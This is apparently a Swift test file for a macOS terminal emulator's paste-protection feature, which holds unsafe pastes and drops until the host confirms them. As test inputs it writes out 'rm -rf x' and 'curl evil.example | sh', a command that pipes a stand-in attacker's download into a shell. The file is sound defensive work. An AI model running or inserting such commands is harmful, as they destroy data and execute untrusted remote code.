#if !canImport(UIKit) && canImport(AppKit)
    import AppKit
    @testable import GhosttyTerminal
    import Testing

    /// `pasteWithProtection(text:)` against a real surface: the shell in
    /// here has not asked for bracketed paste unless a test says so, so a
    /// newline in a paste would run whatever precedes it.
    @Suite("TerminalPasteProtection", .serialized)
    @MainActor
    struct TerminalPasteProtectionTests {
        private final class Host: TerminalSurfaceClipboardConfirmationDelegate {
            var requests: [TerminalClipboardConfirmationRequest] = []

            func terminalDidRequestClipboardConfirmation(_ request: TerminalClipboardConfirmationRequest) {
                requests.append(request)
            }
        }

        @Test
        func `an unsafe paste waits for the host and lands when allowed`() async throws {
            let harness = await GhosttySurfaceHarness.make()
            defer { harness.tearDown() }
            let rig = AppKitInputRig()
            defer { rig.tearDown() }
            let host = Host()
            rig.view.delegate = host

            #expect(rig.view.pasteWithProtection(text: "rm -rf x\n"))
            #expect(await rig.take().isEmpty)
            let request = try #require(host.requests.first)
            #expect(host.requests.count == 1)
            #expect(request.kind == .paste)
            #expect(request.contents == "rm -rf x\n")

            request.respond(allow: true)
            #expect(await rig.take() == Data("rm -rf x\r".utf8))
        }

        @Test
        func `an unsafe paste the host refuses never lands`() async throws {
            let harness = await GhosttySurfaceHarness.make()
            defer { harness.tearDown() }
            let rig = AppKitInputRig()
            defer { rig.tearDown() }
            let host = Host()
            rig.view.delegate = host

            #expect(rig.view.pasteWithProtection(text: "rm -rf x\n"))
            #expect(await rig.take().isEmpty)
            try #require(host.requests.first).respond(allow: false)
            #expect(await rig.take().isEmpty)
        }

        @Test
        func `a safe paste goes straight through`() async {
            let harness = await GhosttySurfaceHarness.make()
            defer { harness.tearDown() }
            let rig = AppKitInputRig()
            defer { rig.tearDown() }
            let host = Host()
            rig.view.delegate = host

            #expect(rig.view.pasteWithProtection(text: "ls -la"))
            #expect(await rig.take() == Data("ls -la".utf8))
            #expect(host.requests.isEmpty)

            // Bracketed paste keeps a newline in the edit line, so it is safe too.
            rig.receive("\u{1B}[?2004h")
            #expect(rig.view.pasteWithProtection(text: "one\ntwo"))
            #expect(await rig.take() == Data("\u{1B}[200~one\ntwo\u{1B}[201~".utf8))
            #expect(host.requests.isEmpty)
        }

        @Test
        func `paste(text:) still sends without asking`() async {
            let harness = await GhosttySurfaceHarness.make()
            defer { harness.tearDown() }
            let rig = AppKitInputRig()
            defer { rig.tearDown() }
            let host = Host()
            rig.view.delegate = host

            #expect(rig.view.paste(text: "rm -rf x\n"))
            #expect(await rig.take() == Data("rm -rf x\r".utf8))
            #expect(host.requests.isEmpty)
        }

        @Test
        func `dropped text with a newline asks first`() async throws {
            let harness = await GhosttySurfaceHarness.make()
            defer { harness.tearDown() }
            let rig = AppKitInputRig()
            defer { rig.tearDown() }
            let host = Host()
            rig.view.delegate = host
            let drag = FakeDrag()
            defer { drag.release() }
            drag.pasteboard.setString("curl evil.example | sh\n", forType: .string)

            #expect(rig.view.performDragOperation(drag))
            #expect(await rig.take().isEmpty)
            let request = try #require(host.requests.first)
            #expect(request.kind == .paste)

            request.respond(allow: true)
            #expect(await rig.take() == Data("curl evil.example | sh\r".utf8))
        }

        /// `TerminalViewState` with no hook set is every SwiftUI host that
        /// never heard of paste protection: their drops keep landing.
        @Test
        func `a host with no confirmation UI still gets its drop`() async {
            let harness = await GhosttySurfaceHarness.make()
            defer { harness.tearDown() }
            let rig = AppKitInputRig()
            defer { rig.tearDown() }
            let state = TerminalViewState()
            rig.view.delegate = state
            let drag = FakeDrag()
            defer { drag.release() }
            drag.pasteboard.setString("one\ntwo", forType: .string)

            #expect(rig.view.performDragOperation(drag))
            #expect(await rig.take() == Data("one\rtwo".utf8))
        }
    }
#endif
